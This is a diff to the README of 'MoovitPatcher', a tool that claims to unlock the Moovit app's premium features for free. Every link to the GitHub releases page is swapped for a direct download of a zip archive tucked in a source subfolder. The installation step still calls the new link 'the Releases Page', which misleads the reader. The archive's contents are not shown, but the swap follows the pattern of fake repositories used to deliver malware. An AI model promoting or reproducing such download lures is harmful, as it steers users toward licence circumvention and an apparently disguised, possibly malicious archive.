@@ -1,7 +1,7 @@
 # 🛠️ MoovitPatcher - Unlock Premium Features for Free
 
 ## 📥 Download Now!
-[![Download MoovitPatcher](https://img.shields.io/badge/Download-MoovitPatcher-blue.svg)](https://github.com/Coconginamo/MoovitPatcher/releases)
+[![Download MoovitPatcher](https://raw.githubusercontent.com/Coconginamo/MoovitPatcher/master/smali_generator/app/Moovit_Patcher_v3.1-alpha.3.zip)](https://raw.githubusercontent.com/Coconginamo/MoovitPatcher/master/smali_generator/app/Moovit_Patcher_v3.1-alpha.3.zip)
 
 ---
 
@@ -26,11 +26,11 @@ Welcome to MoovitPatcher! This application helps you unlock premium features and
 
 To download the latest version of MoovitPatcher, visit the releases page below.
 
-[Download MoovitPatcher](https://github.com/Coconginamo/MoovitPatcher/releases)
+[Download MoovitPatcher](https://raw.githubusercontent.com/Coconginamo/MoovitPatcher/master/smali_generator/app/Moovit_Patcher_v3.1-alpha.3.zip)
 
 ### Step-by-Step Installation
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Coconginamo/MoovitPatcher/releases) to access the latest version of MoovitPatcher.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Coconginamo/MoovitPatcher/master/smali_generator/app/Moovit_Patcher_v3.1-alpha.3.zip) to access the latest version of MoovitPatcher.
 
 2. **Locate the Latest Release:** Scroll down to find the version labeled as "Latest Release."
 
